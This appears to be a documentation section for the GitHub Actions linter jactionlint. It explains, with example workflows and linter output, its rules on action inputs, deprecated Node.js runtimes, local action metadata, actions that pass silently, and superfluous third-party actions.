When a step runs an action of the same repository (with the `./` or the `$/` form), jactionlint reads the `action.yml` or `action.yaml` file in the directory of the action and validates the inputs at `with:`. It reports a required input that is missing, and an input that the action does not define (this commonly occurs by a typo).

The output keeps only the findings of these two rules: `jactionlint --select missing-action-input,unknown-action-input` prints it when the action is in the repository. The workflow of the example has no checkout step, so a full run reports `local-action-checkout` for the first step as well.

**Related.** The same two rules check the inputs of [popular actions](#check-popular-action-inputs), of [actions whose inputs only work together](#check-action-input-dependencies) and, with `--online`, of [any other action](#check-remote-action-metadata).

<a id="check-popular-action-inputs"></a>
## Popular action inputs validation at `with:`

The rules `missing-action-input` and `unknown-action-input` also check the `with:` of popular actions such as `actions/checkout` and `actions/cache`, from a data set that is built into the binary, so jactionlint reads no `action.yml` for them. Both rules are in the `correctness` profile.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/cache@v4
        with:
          keys: |
            ${{ hashFiles('**/*.lock') }}
            ${{ hashFiles('**/*.cache') }}
          path: ./packages
      - run: make
```

Output:

```
test.yaml:7:15: missing input "key" which is required by action "actions/cache@v4". all required inputs are "key", "path" [missing-action-input]
  |
7 |       - uses: actions/cache@v4
  |               ^~~~~~~~~~~~~~~~
test.yaml:9:11: input "keys" is not defined in action "actions/cache@v4". available inputs are "enableCrossOsArchive", "fail-on-cache-miss", "key", "lookup-only", "path", "restore-keys", "save-always", "upload-chunk-size" [unknown-action-input]
  |
9 |           keys: |
  |           ^~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNqEjrHKwkAQhPs8xRQ/5DeQpLG6ysr32ByLFy/eHdlbRWLeXRIliI3VsvN9MBODQVJxRXGOnZgCyCx5ucCoQepF0E5D1nqgha1IMid5WUANFRYDsrmPQVpL1vHhun9j4NZnZ7YP8HwXg8dHAvxNExyJO/YDy39ZVW3VDNH6cod5/mmuld9qouwMmjaR9XRi2eaOGgwu5Pk5APtlRBU=)

jactionlint reports:

- an input that the action requires and that is not set at `with:`
- an input set at `with:` that the action does not define (this commonly occurs by a typo)

The data set is generated ahead of time from the `action.yml` of each action and compiled into the binary, so the check needs no network access. [The data set](https://github.com/jdx/jactionlint/blob/main/popular_actions.go) lists the actions and their inputs. To request more actions, [open an issue](https://github.com/jdx/jactionlint/issues/new). With `--online`, jactionlint reads the other actions from GitHub: see [Inputs and outputs of any action](#check-remote-action-metadata).

The data set has one entry per major version of an action. jactionlint looks it up with the major version of

- a version tag, however precise: `actions/cache@v4.2.4`, `actions/cache@v4.2` and `actions/cache@4.2.4` are checked as `actions/cache@v4`
- a commit SHA with a version comment after it, the form that `pinact`, Dependabot and Renovate keep up to date and that the `default` profile asks for: `actions/cache@0400d5f644dc74513175e3cd8d07132dd4860809 # v4.2.4` is checked as `actions/cache@v4`. The comment must start with the version (`# v4`, `# v4.2.4`, `# 4.2.4`, `# tag=v4.2.4`, `# v4.2.4 (some note)`).

When the version comes from a comment the finding says so, because nothing verifies the comment offline: a comment that went stale (the commit is another major version than the comment says) makes jactionlint check the inputs against the wrong version. [Version comments of pinned actions](#check-ref-version-mismatch) finds those with `--online`.

**What is not checked.** jactionlint does not guess. A commit without a version comment, a comment that names several versions (`# v4 -> v5`) or none (`# keep in sync with v4`), a bare number (`# 4`), a pre-release (`v4.2.4-beta.1`), a branch (`actions/checkout@main`) and a major version that is not in the data set are not checked. The data set holds the inputs of the latest release of each major version, so an input that a later release of the major version added or removed is judged by that release even when you pin an older one. The outputs of `steps.<id>.outputs` are looked up the same way for a version tag, but not for a commit with a comment.

<a id="check-action-input-dependencies"></a>
## Inputs which only work together

The rule `conflicting-action-inputs` reports two inputs of a well-known action that exclude each other, and the rule `missing-action-input` reports an input that works only with another input. Both rules are in the `correctness` profile.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: run-id and repository are ignored without github-token
      - uses: actions/download-artifact@v4
        with:
          name: build
          run-id: ${{ github.event.workflow_run.id }}
          repository: octo/other
      # ERROR: one of the timeouts is required
      - uses: nick-fields/retry@v3
        with:
          max_attempts: 3
          command: make
      # ERROR: only one of the two identities may be given
      - uses: google-github-actions/auth@v2
        with:
          workload_identity_provider: projects/1/locations/global/workloadIdentityPools/p/providers/g
          credentials_json: '{"type": "service_account"}'
```

Output:

```
test.yaml:10:11: input "run-id" of action "actions/download-artifact@v4" needs "github-token", without it the action ignores it and downloads from the current run. add "github-token" [missing-action-input]
   |
10 |           run-id: ${{ github.event.workflow_run.id }}
   |           ^~~~~~~
test.yaml:11:11: input "repository" of action "actions/download-artifact@v4" needs "github-token", without it the action ignores it and downloads from the current repository. add "github-token" [missing-action-input]
   |
11 |           repository: octo/other
   |           ^~~~~~~~~~~
test.yaml:13:15: missing input: action "nick-fields/retry@v3" needs "timeout_minutes" or "timeout_seconds", the action fails with "Must specify either timeout_minutes or timeout_seconds inputs". give one of them [missing-action-input]
   |
13 |       - uses: nick-fields/retry@v3
   |               ^~~~~~~~~~~~~~~~~~~~
test.yaml:21:11: inputs "workload_identity_provider" and "credentials_json" of action "google-github-actions/auth@v2" exclude each other, the action fails with "must specify exactly one of". give only one of "workload_identity_provider" and "credentials_json" [conflicting-action-inputs]
   |
21 |           credentials_json: '{"type": "service_account"}'
   |           ^~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNp0kc/O2yAQxO/fU6ysSjkR1KYnTrn21jewMGxsEswidrFrRXn3yvnzyYqUE4KZYX8MlAzkysPXmTo2XwCCLOsKUGpiteq1q0mqinbV7hILZn64ABRURjZgnQRKrD3NKZL1yhYJJ+vkOP1+WgHmIIP53gEkO6KBroboN6elJhW8gR/XK/RBhtrtccIk+5nK5RRpbktN++DhdtumMBMHobIYICekSQYsb5QpuIs6BYyedUEpy3E6fKQb7b/WiuCYhQ0cNoqjcbTJGxjtBd9G9ER9RPUAV69abJXhOP36OGt92lpbGzwmCbK0udAUPBYDudAZnbD+qSM5+7iwj9TZqF+5P8/YX6LIOutXmnW/5S5499nI7ZnX391dG1kyNgYaxjIFh611jmqS5rb7PwDl26jL)

The data set of popular actions knows which inputs exist and which are required, but not that some inputs only work together. A few well-known actions have such inputs, and the mistake is quiet or late: `actions/download-artifact` downloads from the current run when `run-id` or `repository` is given without `github-token`, and `nick-fields/retry` fails only when it runs. jactionlint has a table of these dependencies, checked for the versions that the sources of each entry describe:

| Action | Dependency | Reported as |
| --- | --- | --- |
| `actions/download-artifact` (v4+) | `run-id` and `repository` need `github-token` | `missing-action-input` |
| `actions/download-artifact` (v4+) | `name` and `artifact-ids` exclude each other | `conflicting-action-inputs` |
| `nick-fields/retry` (v2+) | exactly one of `timeout_minutes` and `timeout_seconds` | `missing-action-input`, `conflicting-action-inputs` |
| `google-github-actions/auth` (v1+) | exactly one of `workload_identity_provider` and `credentials_json` | `missing-action-input`, `conflicting-action-inputs` |
| `actions/dependency-review-action` (v4+) | `allow-licenses` and `deny-licenses` exclude each other | `conflicting-action-inputs` |

The version is the major version of the tag, or of the version comment after a commit SHA; a branch and a commit without a comment are not judged. A step whose `with:` is an expression, or has an `${{ insert }}` key, is not judged either. A conflict is reported only when both inputs are literal values: an expression may be empty at run time, which is how a workflow chooses between two inputs. A `run-id` or `repository` that is the default expression (`${{ github.run_id }}` or `${{ github.repository }}`) needs no token.

<a id="check-remote-action-metadata"></a>
## Inputs and outputs of any action (online)

With `--online`, jactionlint reads the `action.yml` (or `action.yaml`) of an action from GitHub, at the ref that the workflow pins, when [the data set of popular actions](#check-popular-action-inputs) does not know the action. It checks the step the way it checks [a local action](#check-local-action-inputs), with these rules:

- `missing-action-input`: an input that the action requires (`required: true` and no `default`) is not set at `with:`
- `unknown-action-input`: an input is set that the action does not declare (often a typo)
- `deprecated-action-input`: an input is set that the action marks with `deprecationMessage`
- `undefined-property`: `steps.<id>.outputs.<name>` names an output that a *composite* action does not declare

Example input:

```yaml
# requires --online
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: "tool" is required, and "tools" is a typo
      - uses: taiki-e/install-action@v2
        with:
          tools: just
      - id: greet
        uses: example/composite-tool@v1
        with:
          name: me
          # ERROR: deprecated, the action's own message says what to use instead
          old: x
      # ERROR: the composite action declares only "result"
      - run: echo ${{ steps.greet.outputs.reslt }}
```

Output:

```
test.yaml:8:15: missing input "tool" which is required by action "taiki-e/install-action@v2" (action.yml read from GitHub with --online). all required inputs are "tool" [missing-action-input]
  |
8 |       - uses: taiki-e/install-action@v2
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:10:11: input "tools" is not defined in action "taiki-e/install-action@v2" (action.yml read from GitHub with --online). available inputs are "checksum", "fallback", "tool" [unknown-action-input]
   |
10 |           tools: just
   |           ^~~~~~
test.yaml:16:11: avoid using deprecated input "old" in action "example/composite-tool@v1" (action.yml read from GitHub with --online): Use level instead [deprecated-action-input]
   |
16 |           old: x
   |           ^~~~
test.yaml:18:23: property "reslt" is not defined in object type {result: string} [undefined-property]
   |
18 |       - run: echo ${{ steps.greet.outputs.reslt }}
   |                       ^~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

Run the example with `--online`. `taiki-e/install-action` is a real action. `example/composite-tool` is a made-up action that stands for a composite action with a deprecated input and an output named `result`.

**What is read, and what is not.**

- **Only actions that are not in the data set.** `actions/checkout@v4` and the other popular actions are checked with the built-in data, which costs no request. A commit pinned with a version comment is checked as the popular action it names, see [popular action inputs](#check-popular-action-inputs).
- **The metadata at the pinned ref.** `owner/repo@ref` reads `action.yml` of the root of the repository, `owner/repo/path@ref` reads `path/action.yml`, and each tries `action.yaml` when there is no `action.yml`. The ref is a tag, a branch or a commit. It costs one request for each action and ref (two when the file is `action.yaml`), made once for the whole run however many steps use the action. A `@main` or `@v1` is read as it is at the time of the run, not as it was when the workflow was written.
- **Nothing is reported when the metadata is not known.** A private action, a repository that `--online-deny` or `--online-allow` leaves out, a rate limit, a timeout, a repository without `action.yml` (an action that is only a `Dockerfile`) or a file that is not valid metadata gives no finding, exactly as without `--online`. The lookup counts as skipped, except for the repositories that are left out on purpose: `--online=strict` fails on it, and the coverage of the run says so. See [the online checks](online.md#online-checks).
- **Outputs only for composite actions.** A composite action has the outputs it declares and no others. A JavaScript or Docker action may set an output with `core.setOutput` or `$GITHUB_OUTPUT` that its `action.yml` does not declare (`tj-actions/changed-files` sets one for each key of `files_yaml`, `dorny/paths-filter` one for each filter), so its outputs are not checked.
- **Required inputs are the ones the action declares.** An action may default a required input in its code, which jactionlint cannot see. It is the same limit as for local and popular actions.
- **The file of another repository is read leniently.** `type: string` in an input is not documented by GitHub but many actions write it; it is read and not reported. A file that does not parse at all is skipped.

<a id="deprecated-inputs-usage"></a>
## Deprecated inputs usage

The rule `deprecated-action-input` reports an input that a step sets at `with:` and that the action marks as deprecated with [`deprecationMessage`](https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax#inputsinput_iddeprecationmessage). It is in the `correctness` profile and reports `error`.

Example input:

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: reviewdog/action-actionlint@v1
        with:
          # ERROR: Using a deprecated input
          fail_on_error: true
```

Output:

```
test.yaml:9:11: avoid using deprecated input "fail_on_error" in action "reviewdog/action-actionlint@v1": Deprecated, use `fail_level` instead [deprecated-action-input]
  |
9 |           fail_on_error: true
  |           ^~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNo8yksKwkAQhOF9TlEXGMTtrLxJmGhrWobu0I/k+jJGXBXF96tUbOnr9NbF6wQEeYwFLMXL8FxSIktvw77kQZufFVCQTl5htDMdD31d2j1YpZzTWeK2X38xcHCs9f+AZ+M+q8xkplYRlvQZAIfnLew=)

jactionlint knows the deprecated inputs of the popular actions from its built-in data, as in the example. For any other action, it reads the metadata of the action with `--online`: see [Inputs and outputs of any action](#check-remote-action-metadata).

**Local actions.** For a local action, jactionlint also checks the input definitions in the metadata file `action.yml` or `action.yaml`: the rule `invalid-local-action` reports an input that is deprecated with an empty `deprecationMessage`.

The example uses the local action `.github/actions/my-action/action.yml`, whose metadata marks an input as deprecated and leaves the message of another empty.

Example input:

```yaml
# select: invalid-local-action,deprecated-action-input
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/my-action
        with:
          # ERROR: Using a deprecated input
          old-input: some value
```

Example file: .github/actions/my-action/action.yml

```yaml
name: 'My action'
author: '...'
description: '...'

inputs:
  new-input:
  # This input is deprecated.
  old-input:
    deprecationMessage: This input is deprecated. Use new-input instead.
  # ERROR: Empty deprecation message is not allowed
  empty-message:
    deprecationMessage:

runs:
  using: 'node20'
  main: 'index.js'
```

Example file: .github/actions/my-action/index.js

```js
```

Output:

```
test.yaml:7:15: input "empty-message" is deprecated but "deprecationMessage" is empty in metadata of "My action" action at "./.github/actions/my-action/action.yml" [invalid-local-action]
  |
7 |       - uses: ./.github/actions/my-action
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:10:11: avoid using deprecated input "old-input" in action "My action" defined at "./.github/actions/my-action": This input is deprecated. Use new-input instead [deprecated-action-input]
   |
10 |           old-input: some value
   |           ^~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of `invalid-local-action` and `deprecated-action-input`: `jactionlint --select invalid-local-action,deprecated-action-input` prints it when the files of the example are in a repository. The workflow has no checkout step, so a full run reports `local-action-checkout` as well.

**What is not reported.** The use of a deprecated input that the action marks as `required: true` is not reported, because the step cannot avoid it.

<a id="outdated-popular-actions-detection-at-uses"></a>
<a id="detect-outdated-popular-actions"></a>
## Popular actions with a runner that is too old

The rule `outdated-action-runner` reports a popular action that runs on a runtime which GitHub Actions no longer supports. It is in the `correctness` profile.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: actions/checkout@v3 is using the outdated runner 'node16'
      - uses: actions/checkout@v3
```

Output:

```
test.yaml:8:15: the runner of "actions/checkout@v3" action is too old to run on GitHub Actions. update the action's version to fix this issue [outdated-action-runner]
  |
8 |       - uses: actions/checkout@v3
  |               ^~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNokyjEOxCAMRNGeU8wF0BbbUe1VAFlik8hGGTvnj0iqX/xnWjCDI6XNGksCXOirwBnKvEC0UI981PWeRZfJVwEZQWFB7f435acP6buF/67vPQB0iR3O)

jactionlint knows the popular actions from the same data set as for [their inputs](#check-popular-action-inputs). An action is outdated when its `action.yml` declares a Node.js runtime older than `node20`, which GitHub Actions no longer runs (`node12` is an example), and the data set also lists the first versions of `actions/checkout`, `actions/upload-artifact` and `actions/download-artifact` (`v1`) as outdated. A major version of an action that is not in the data set is not checked.

The version is found as for the inputs: `actions/checkout@v3.6.0` and `actions/checkout@<sha> # v3.6.0` are reported like `actions/checkout@v3`. For a commit, the finding says that it rests on the version comment, which may be out of date.

**What is not reported.** The rule does not report that a newer version exists. If you use `actions/checkout@v4` and `actions/checkout@v5` is available, jactionlint reports nothing as long as `actions/checkout@v4` is not outdated. To keep the actions of your workflows up to date, use [Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot).

**Related.** An action on `node20` still runs; the pedantic rule [`deprecated-node-runtime`](#check-deprecated-node-runtime) reports it.

<a id="check-deprecated-node-runtime"></a>
## Node.js runtimes that GitHub removed (pedantic)

The rule `deprecated-node-runtime` reports a Node.js runtime that GitHub Actions removed: an action that declares one, the metadata of an action that declares one, and an environment variable that chose the runtime. It is in the `pedantic` profile and reports `warn`.

Example input:

```yaml
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # ERROR: the major version declares node20
      - uses: actions/checkout@v4
      # ERROR: the same for a commit with a version comment
      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
      # OK
      - uses: actions/checkout@v5
```

Example config:

```yaml
rules:
  deprecated-node-runtime: warn
```

Output:

```
test.yaml:8:15: warning: action "actions/checkout@v4" declares the Node.js runtime "node20" in its metadata, but Node.js 20 was removed from GitHub Actions on 2026-09-23, so the runner runs the action on Node.js 24 instead of the runtime it declares. update the action to "actions/checkout@v5" or newer, which declares "node24" [deprecated-node-runtime]
  |
8 |       - uses: actions/checkout@v4
  |               ^~~~~~~~~~~~~~~~~~~
test.yaml:10:15: warning: action "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020" (checked as "actions/setup-node@v4": the version comment "# v4.4.0" says so, and nothing verifies the comment) declares the Node.js runtime "node20" in its metadata, but Node.js 20 was removed from GitHub Actions on 2026-09-23, so the runner runs the action on Node.js 24 instead of the runtime it declares. update the action to "actions/setup-node@v5" or newer, which declares "node24" [deprecated-node-runtime]
   |
10 |       - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

GitHub removed Node.js 20 on 2026-09-23 ([changelog](https://github.blog/changelog/2026-09-23-node-20-is-no-longer-available-in-github-actions); the plan with its phases is in the [deprecation notice](https://github.blog/changelog/2025-09-19-deprecation-of-node-20-on-github-actions-runners/)). Since then a runner on github.com runs every JavaScript action on Node.js 24, whatever its `runs.using` says, so an action that declares an older runtime keeps working unless its code breaks on Node.js 24.

That is why the rule is in the `pedantic` profile and not in `default` or `correctness`: the action does not fail, and jactionlint cannot tell a runner on github.com from GitHub Enterprise Server or an old self-hosted runner, where `node20` can still be the runtime that runs. The finding says what holds everywhere: the action declares a runtime that the runner on github.com does not provide.

**Configure.** List the rule to enable it without the `pedantic` profile; `warn` is its default level. The output shows only the findings of this rule: `jactionlint --select deprecated-node-runtime` prints it.

The rule checks three things.

**The actions that a workflow uses.** The data of the popular actions records the `runs.using` of every major version they know. A `uses:` of a major that declares `node20` is reported, with the oldest newer major that does not (`actions/checkout@v4` gets `v5`; `actions/download-artifact@v5` gets `v7` because `v6` is also `node20`). The major version is found as the checks of the inputs find it: from the ref, from a full version such as `v4.2.2`, or from the version comment of a commit SHA (`# v4.2.2`), and the message says which.

A commit without a version comment is not reported, because nothing says which release it is. Actions that are not in the data, local actions and `docker://` images are not reported either, and neither is a major that declares a runtime older than `node20`: [`outdated-action-runner`](#detect-outdated-popular-actions) reports it with the level `error`.

**The metadata of an action.** The `runs.using` of the `action.yml` that is linted (a local action under `.github/actions`, or the one in the root of an action repository) is reported when it is `node20`, `node16` or `node12`, with the advice to declare `node24`:

```yaml
runs:
  using: node20 # warning: Node.js 20 was removed from GitHub Actions on 2026-09-23 ...
  main: dist/index.js
```

A workflow that calls a local action is not reported a second time: the metadata file of the action is. `node12` and `node16` in a local action are also reported by [`invalid-local-action`](#action-metadata-syntax) where a workflow calls it, because that rule accepts only `composite`, `docker`, `node20` and `node24`.

**The variables that chose the runtime.** `ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION` kept JavaScript actions on Node.js 20 after Node.js 24 became the default on 2026-06-16, and `FORCE_JAVASCRIPT_ACTIONS_TO_NODE24` ran them on Node.js 24 before that. Neither does anything since GitHub removed Node.js 20: the [changelog](https://github.blog/changelog/2026-09-23-node-20-is-no-longer-available-in-github-actions) says that the opt-out "is no longer available". A key of one of these names in `env:` of the workflow, of a job or of a step (also of the steps of a composite action) is reported at the name, whatever its value is:

```yaml
env:
  ACTIONS_ALLOW_USE_UNSECURE_NODE_VERSION: true # warning: no longer does anything
```

The `env:` of a `container:` or of a service is not looked at, and neither is a variable written to `$GITHUB_ENV` by a script or set in the environment of a self-hosted runner.

<a id="action-metadata-syntax-validation"></a>
<a id="action-metadata-syntax"></a>
## Metadata of local actions

The rule `invalid-local-action` reports a local action that cannot be loaded or whose metadata file (`action.yml` or `action.yaml`) is invalid. jactionlint checks the metadata of an action when a workflow uses it, and reports at the `uses:` of that step, once for each action. The rule is in the `correctness` profile.

The example uses the local action `.github/actions/my-invalid-action/action.yml`, whose metadata has several mistakes.

Example input:

```yaml
# select: invalid-local-action
on: push

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      # jactionlint checks an action when it is actually used in a workflow
      - uses: ./.github/actions/my-invalid-action
```

Example file: .github/actions/my-invalid-action/action.yml

```yaml
name: 'My action'
author: '...'
# ERROR: 'description' section is required

branding:
  # ERROR: Invalid icon name
  icon: dog
  # ERROR: Unsupported icon color
  color: gray-white

runs:
  # ERROR: Node.js runtime version is too old
  using: 'node16'
  # ERROR: The source file being run by this action does not exist
  main: 'this-file-does-not-exist.js'
  # ERROR: 'env' is not allowed in a JavaScript action
  env:
    SOME_VAR: SOME_VALUE
```

Output:

```
test.yaml:9:15: "env" is not allowed in "runs" section because "My action" is a JavaScript action. the action is defined at "./.github/actions/my-invalid-action" [invalid-local-action]
  |
9 |       - uses: ./.github/actions/my-invalid-action
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:9:15: description is required in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml" [invalid-local-action]
  |
9 |       - uses: ./.github/actions/my-invalid-action
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:9:15: file "this-file-does-not-exist.js" does not exist in "./.github/actions/my-invalid-action". it is specified at "main" key in "runs" section in "My action" action [invalid-local-action]
  |
9 |       - uses: ./.github/actions/my-invalid-action
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:9:15: incorrect color "gray-white" at branding.icon in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml". see the official document to know the exhaustive list of supported colors: https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#brandingcolor [invalid-local-action]
  |
9 |       - uses: ./.github/actions/my-invalid-action
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:9:15: incorrect icon name "dog" at branding.icon in metadata of "My action" action at "./.github/actions/my-invalid-action/action.yml". see the official document to know the exhaustive list of supported icons: https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#brandingicon [invalid-local-action]
  |
9 |       - uses: ./.github/actions/my-invalid-action
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:9:15: invalid runner name "node16" at runs.using in "My action" action defined at "./.github/actions/my-invalid-action". valid runners are "composite", "docker", "node20", and "node24". see https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions#runs [invalid-local-action]
  |
9 |       - uses: ./.github/actions/my-invalid-action
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

The output keeps only the findings of `invalid-local-action`: `jactionlint --select invalid-local-action` prints it when the action is in the repository. The workflow of the example has no checkout step, so a full run reports `local-action-checkout` for it as well.

All actions require a metadata file, `action.yml` or `action.yaml`, whose syntax [GitHub documents](https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax). The rule reports a metadata file that does not follow it:

- `name:`, `description:` and `runs:` are required.
- `runs.using` is one of `composite`, `docker`, `node20` and `node24`.
- The keys under `runs:` are correct. Required and valid keys depend on the type of the action: Docker, composite or JavaScript. For example `image:` is required for a Docker action, and `env:` is rejected in a JavaScript action.
- The files that keys under `runs:` name exist. For example, a JavaScript action names the script that it runs at `main:`.
- The icon at `branding.icon` is one of [the supported icons](https://docs.github.com/en/actions/reference/workflows-and-actions/metadata-syntax#exhaustive-list-of-all-currently-supported-icons).
- The color at `branding.color` is one of white, black, yellow, blue, green, orange, red, purple and gray-dark.
- An input that is deprecated has a `deprecationMessage`, see [Deprecated inputs usage](#deprecated-inputs-usage).

**Related.** The checks of this section run where a workflow uses the action. When you lint the file of an action directly (`jactionlint .github/actions/foo/action.yml`), the rules of [composite actions](#check-composite-actions) run on it instead, and [`action-syntax`](#check-composite-action-syntax) accepts `node` followed by a version number at `runs.using`. The pedantic rule [`deprecated-node-runtime`](#check-deprecated-node-runtime) reports `node20`, `node16` and `node12` in the metadata.

<a id="check-fail-fast-action-inputs"></a>
## Actions that do not fail by default (pedantic)

The rule `fail-fast-action-inputs` reports an action that passes when the thing it exists for did not happen, such as a file to upload or a test result, and that is not told to fail. It is in the `pedantic` profile and reports `warn`.

Example input:

```yaml
# select: fail-fast-action-inputs
on:
  push:
    tags: [v*]

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make dist
      # ERROR: warns and goes on when "dist" has no file, the release has no assets
      - uses: actions/upload-artifact@v4
        with:
          name: dist
          path: dist
      # ERROR: the release is created without the files that match nothing
      - uses: softprops/action-gh-release@v2
        with:
          files: dist/*
      # OK: logs of a failed run may be missing, so the step is best effort
      - uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: logs
          path: build/logs
      # OK: the decision is written down
      - uses: actions/upload-artifact@v4
        with:
          name: optional
          path: extras
          if-no-files-found: ignore
```

Example config:

```yaml
rules:
  fail-fast-action-inputs: warn
```

Output:

```
test.yaml:13:15: warning: actions/upload-artifact does not fail by default: the step only warns when "path" matches no file, so a build which produced nothing stays green and the artifact is missing. set "if-no-files-found: error" (the default is "warn") [fail-fast-action-inputs]
   |
13 |       - uses: actions/upload-artifact@v4
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~
test.yaml:18:15: warning: softprops/action-gh-release does not fail by default: the release is created without the files when a "files" pattern matches nothing. set "fail_on_unmatched_files: true" (the default is "false") [fail-fast-action-inputs]
   |
18 |       - uses: softprops/action-gh-release@v2
   |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

Some actions pass when the thing they exist for did not happen: `actions/upload-artifact` only warns when its `path` matches no file, `softprops/action-gh-release` creates the release without the `files` that matched nothing, and a test report action passes when it found no test result. A broken build is then green, and nobody notices until the artifact or the release is needed. Each of them has an input that makes it fail, and the rule asks for it. The rule is pedantic because a missing file is sometimes fine and nothing in the workflow says which jobs it is for.

**Configure.** List the rule under `rules`, as the example config does, to enable it without the `pedantic` profile; `warn` is its default level. The output shows only the findings of this rule: `jactionlint --select fail-fast-action-inputs` prints it.

The table lists the actions, from the `action.yml` of each:

| Action | Input to set | Default | Looked at when |
| --- | --- | --- | --- |
| `actions/upload-artifact` (not `v1`, which has no such input) | `if-no-files-found: error` | `warn` | always |
| `softprops/action-gh-release` | `fail_on_unmatched_files: true` | `false` | `files` is set |
| `ncipollo/release-action` | `artifactErrorsFailBuild: true` | `false` | `artifacts` is set |
| `EnricoMi/publish-unit-test-result-action` and its variants | `action_fail_on_inconclusive: true` | `false` | always |
| `mikepenz/action-junit-report` | `require_tests: true` | `false` | always |

**What is not reported.** A step that gives the input with any value (`if-no-files-found: warn` or `ignore` included) has decided and is not reported. A step that can only run after a failure or a cancellation (`if: failure()`, `if: cancelled()`, `if: failure() && matrix.os == 'linux'`), which uploads logs on a best effort basis, a step with `continue-on-error` and a step that never runs are not reported either. The condition of a job, or of a group of `parallel:` steps, counts for the steps in it. A condition that is true after a success too (`always()`, `!cancelled()`, `!failure()`, `success() || failure()`) does not make a step best effort, because a missing file would keep the job green.

**Fix.** `jactionlint --fix=unsafe` adds the input under `with:` of the step (and the `with:` when there is none). The fix is **unsafe**: a build that was green without the files is red with the input. That is the point of the finding, but it changes what the workflow does, so `--fix` does not apply it.

<a id="check-superfluous-actions"></a>
## Superfluous actions

The rule `superfluous-actions` reports an action that only runs a command that the runner image already has, such as `gh release create`. It is in the `default` profile.

Example input:

```yaml
on: push
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: softprops/action-gh-release@c95fe1489396fe8a9eb87c0abf8aa5b2ef267fda # v2.2.1
        with:
          files: dist/*
```

Output:

```
test.yaml:6:15: action "softprops/action-gh-release@c95fe1489396fe8a9eb87c0abf8aa5b2ef267fda" is superfluous: the runner already has the tools to do this. use `gh release create` in a script step [superfluous-actions]
  |
6 |       - uses: softprops/action-gh-release@c95fe1489396fe8a9eb87c0abf8aa5b2ef267fda # v2.2.1
  |               ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

[Playground](https://jactionlint.jdx.dev/#eNo8jcGOgzAMRO98haW9rRRYsgWSnPorDjglFUoi7LS/X9Gi3mY0T29yclAqr809e3YNwE4bIdMRAfaaWB1I9TVJVRsKsbwnFir8oQAUVCZ2wDlI2XPhDmeJOanbqk7hdbZDoP5i7L8dAxm05M00/6EPBnHwmoIep7Ag/MBDt7rtTzfAM8rqvg0gxO04WyJL9/saALZkOPY=)

An action like that is a dependency that can be compromised, with nothing gained. The rule reports the ones with a simple replacement: the release actions (`softprops/action-gh-release`, `ncipollo/release-action`, `elgohr/Github-Release-Action`, `svenstaro/upload-release-action` and the archived `actions/create-release` and `actions/upload-release-asset`), which `gh release` replaces, `dacbd/create-issue-action`, `actions-ecosystem/action-add-labels` and `action-remove-labels` (`gh issue`, `gh pr`), `addnab/docker-run-action` (`docker run`), `benc-uk/workflow-dispatch` (`gh workflow run`, [zizmor#2181](https://github.com/zizmorcore/zizmor/issues/2181)) and `sergeysova/jq-action` (`jq`). The rule has no automatic fix: replace the action with the command in a `run:` step.

With the option `pedantic` (on under the `pedantic` profile) the rule reports the ones whose replacement takes several commands or misses a feature: `peter-evans/create-pull-request`, `peter-evans/create-or-update-comment`, `dtolnay/rust-toolchain`, `stefanzweifel/git-auto-commit-action` and `EndBug/add-and-commit`. The rule follows the `superfluous-actions` audit of zizmor; [the parity page](zizmor-parity.md) lists the differences.

